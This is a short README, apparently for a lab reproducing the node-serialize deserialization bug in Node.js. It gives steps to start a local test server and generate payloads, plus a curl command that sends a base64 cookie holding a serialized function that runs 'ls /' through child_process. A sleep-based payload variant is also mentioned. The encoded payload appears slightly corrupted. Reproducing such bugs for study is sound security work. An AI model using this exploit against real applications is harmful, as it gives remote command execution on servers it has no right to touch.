## Test server

```
npm install
nodejs test-server.js
```

## Basic payload

```
# Generate the payload
nodejs payload-generator.js

# Add the () as explained in the blog post
# Base64 encode the payload

# Send the payload and check the server stdout
curl http://localhost:3000 -XGET -H'Cookie: profile=eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCllyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2xzIC8nLCBmdW5jdGlvbihlcnJvciwgc3Rkb3V0LCBzdGRlcnIpIHsgY29uc29sZS5sb2coc3Rkb3V0KSB9KTtcbiB9KCkifQ=='
```

## Advanced payload with sleep

```
nodejs payload-sleep-generator.js
```

Then use `ipython` to get the offsets, and save everything to `node-serialize.json`.

## References
I followed [this document](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)
as reference for the previous steps.

